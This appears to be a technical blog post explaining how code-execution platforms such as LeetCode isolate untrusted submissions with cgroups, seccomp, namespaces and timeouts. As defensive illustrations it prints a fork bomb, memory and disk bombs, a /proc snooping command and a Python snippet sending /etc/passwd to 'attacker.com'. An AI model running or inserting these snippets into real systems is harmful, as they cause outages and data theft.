---
title: how leetcode and code execution platforms actually run untrusted code
slug: how-code-execution-sandboxes-work
date: May 10, 2026
description: the engineering behind running untrusted code at scale — seccomp, cgroups, forkbombs, gVisor, Firecracker, and why your solution sometimes gets TLE even when it shouldn't.
---

you click "submit" on leetcode. your python solution runs against hidden test cases. 300ms later, you get "accepted" or "TLE." but what actually ran your code? a linux container with no network access, a CPU limit, a memory cap, a seccomp filter that blocks 150+ syscalls, and a 5-second wall clock timer. here is the full engineering behind it.

## the sandbox problem

leetcode, hackerrank, and codeforces all execute arbitrary user code. that code can:
- fork bomb (spawn infinite processes)
- read `/etc/passwd`
- open sockets to external hosts
- `while(true) { malloc(1GB); }` until the kernel OOM kills everything
- write to disk until the filesystem is full
- call `reboot()` and crash the server

a single unconstrained submission can take down the entire evaluation infrastructure. the solution: layered isolation.

## layer 1: cgroups (resource limits)

cgroups cap CPU, memory, and processes:

```bash
# create a cgroup for code execution
mkdir /sys/fs/cgroup/code-exec
echo "50000 100000" > /sys/fs/cgroup/code-exec/cpu.max      # 50ms per 100ms (0.5 CPU)
echo "268435456" > /sys/fs/cgroup/code-exec/memory.max       # 256 MB
echo "256" > /sys/fs/cgroup/code-exec/pids.max               # max 256 processes
```

this prevents:
- CPU exhaustion (CPU throttle after quota)
- memory exhaustion (OOM kill at limit)
- fork bombs (pids.max caps the process tree)

**reference**: [cgroups v2](https://www.kernel.org/doc/html/latest/admin-guide/cgroup-v2.html)

## layer 2: seccomp (syscall filtering)

the linux kernel's seccomp (secure computing mode) allows filtering syscalls. in strict mode, only `read`, `write`, `exit`, `sigreturn` are allowed. in filter mode (seccomp-bpf), you define exact rules:

```c
// allow: read, write, close, fstat, mmap, brk, exit
// block: fork, execve, socket, open, mount, reboot, ptrace
struct sock_filter filter[] = {
    BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, nr)),
    BPF_JUMP(BPF_JMP | BPF_JEQ, __NR_read, 0, 1),
    BPF_STMT(BPF_RET, SECCOMP_RET_ALLOW),
    BPF_JUMP(BPF_JMP | BPF_JEQ, __NR_write, 0, 1),
    BPF_STMT(BPF_RET, SECCOMP_RET_ALLOW),
    // ... more allowed syscalls ...
    BPF_STMT(BPF_RET, SECCOMP_RET_KILL), // kill everything else
};
```

docker's default seccomp profile blocks ~44 syscalls. leetcode-style platforms typically block 100+ — anything related to process creation, networking, filesystem access beyond the workspace, and kernel administration.

**reference**: [seccomp man page](https://man7.org/linux/man-pages/man2/seccomp.2.html)

## layer 3: namespaces (visibility isolation)

namespaces hide system resources from the process:

```c
int flags = CLONE_NEWNS    // mount namespace: no access to host filesystem
          | CLONE_NEWNET   // network namespace: no network interfaces
          | CLONE_NEWPID   // PID namespace: can't see host processes
          | CLONE_NEWIPC   // IPC namespace: can't interfere with host IPC
          | CLONE_NEWUTS;  // UTS namespace: isolated hostname
```

combined with a chroot or pivot_root, the submitted code sees only its own workspace directory and has no network, no host process visibility, and no way to escape.

**reference**: [linux namespaces](https://man7.org/linux/man-pages/man7/namespaces.7.html)

## layer 4: wall-clock timeout

a SIGALRM before execution starts:

```c
alarm(5);  // SIGALRM in 5 seconds, no matter what
```

even if cgroups don't throttle (CPU idle) and seccomp allows the syscall, the process dies at the wall clock deadline. an infinite loop that calls nothing is still killed.

## the fork bomb: how it works and how it's stopped

the classic fork bomb:

```c
#include <unistd.h>
int main() {
    while (1) fork();
}
```

this creates processes exponentially. at depth 10, there are 1024 processes. at depth 20, over 1 million. without limits, it fills the process table and the system becomes unresponsive.

defenses at each layer:

| layer | how it stops fork bombs |
|-------|------------------------|
| cgroups `pids.max` | caps total processes in the cgroup, typically 64-256 |
| seccomp | blocks `fork`, `clone`, `execve` entirely |
| namespaces | PID namespace isolates the process tree; host processes unaffected |

leetcode doesn't let you fork at all. seccomp kills the syscall before it executes.

## other attack vectors

### the memory bomb

```c
while (1) { malloc(1024 * 1024); } // allocate 1MB forever
```

cgroups `memory.max` stops this. the process is OOM-killed within its own cgroup. the host is unaffected.

### the disk filler

```python
with open("bigfile", "w") as f:
    while True: f.write("A" * 1024 * 1024)
```

namespace + tmpfs: the submission runs in a temp filesystem with a size limit. when the limit is hit, writes fail with ENOSPC.

### the network exfiltrator

```python
import socket
s = socket.socket()
s.connect(("attacker.com", 80))
s.send(open("/etc/passwd").read())
```

network namespace with no interfaces kills this. `socket()` might succeed (depending on seccomp), but `connect()` fails because there's no network interface and no route.

### the `/proc` snooper

```bash
cat /proc/1/cmdline  # reads host PID 1's command line
```

PID namespace makes `/proc` show only the container's own processes. the host's PID 1 is invisible.

## container runtimes compared

for running untrusted code, you have several isolation tiers:

| runtime | isolation | startup | overhead | use case |
|---------|-----------|---------|----------|----------|
| raw namespaces + seccomp | weak | <1ms | none | trusted code, quick eval |
| runc | moderate | ~10ms | low | docker default, shared kernel |
| gVisor | strong | ~50ms | medium | userspace kernel, syscall interception |
| Firecracker | very strong | ~150ms | high | microVM, AWS Lambda/Fargate |
| kata containers | very strong | ~200ms | high | VM per container |

leetcode and codeforces probably use something close to raw namespaces + seccomp with tight cgroup limits. the isolation is sufficient because:
- the code runs for <5 seconds
- seccomp blocks all dangerous syscalls
- cgroups cap resources tightly
- there's no network access

**reference**: [gVisor](https://github.com/google/gvisor) | [Firecracker](https://github.com/firecracker-microvm/firecracker)

## what happens during a leetcode submission

```
1. user clicks "submit"
2. code is sent to the evaluation server
3. evaluation server creates a temp directory with the code + test harness
4. container runtime:
   a. creates new cgroup (cpu.max, memory.max, pids.max)
   b. sets up PID + mount + network namespaces
   c. applies seccomp filter
   d. chroots into temp directory
5. process is started with alarm(5)
6. test harness runs the submitted function against hidden test cases
7. stdout/stderr are captured
8. return code + output are parsed:
   - 0 = passed all tests (possibly "Accepted")
   - SIGALRM = Time Limit Exceeded
   - SIGSEGV = Runtime Error (segfault)
   - non-zero exit = Wrong Answer or Runtime Error
   - OOM kill = Memory Limit Exceeded
9. temp directory and cgroup are cleaned up
10. result is returned to the user
```

the whole cycle is 200-500ms for a python solution. compiled languages (c++, java, go) add compilation time.

## why TLE sometimes feels wrong

your O(n log n) solution gets TLE. someone else's O(n log n) solution passes. why?

1. **constant factors**: python's `list.sort()` is c-optimized. your custom quicksort in pure python is 50× slower even with the same big-O.
2. **gc pauses**: java submission triggers GC mid-execution. 50ms of GC can push you over the 2-second limit.
3. **I/O in the hot loop**: `print()` inside a loop that runs 100k times. each print is a syscall. cumulatively, 300ms of I/O.
4. **cold starts**: the worker pulls your code, compiles it, links it. java JVM startup alone is 200-300ms. leetcode accounts for this in time limits, but it varies.
5. **noisy neighbor**: 10 submissions running on the same node. CPU throttling kicks in at different times.

## further reading

- [cgroups v2](https://www.kernel.org/doc/html/latest/admin-guide/cgroup-v2.html)
- [seccomp](https://man7.org/linux/man-pages/man2/seccomp.2.html)
- [linux namespaces](https://man7.org/linux/man-pages/man7/namespaces.7.html)
- [gVisor](https://github.com/google/gvisor)
- [Firecracker](https://github.com/firecracker-microvm/firecracker)
